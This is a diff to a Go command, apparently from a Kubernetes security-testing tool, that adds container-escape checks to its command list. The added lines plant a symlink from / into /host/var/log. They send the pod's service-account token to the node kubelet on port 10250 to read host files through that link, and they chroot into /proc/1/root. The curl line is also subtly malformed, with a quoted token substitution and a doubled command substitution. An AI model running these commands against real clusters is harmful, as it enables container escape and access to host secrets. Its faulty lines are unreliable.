@@ -56,6 +56,10 @@ var escapeCmd = &cobra.Command{
 			{"ls", "/var/run/docker.socket"},
 			//GDB
 			{"/bin/sh", "-c", "cat /etc/mtab | head -n 10"},
+			//CHECK SYMLINK ATTK
+			{"/bin/sh", "-c", "ln -s / /host/var/log/root_link"},
+			{"curl -sk -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://$($(ip route | awk '/^default/{print $3}')):10250/logs/root_link/var/lib/kubelet/pods/"},
+			{"/bin/sh", "-c", "chroot /proc/1/root"},
 		}
 
 		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper, privileged)
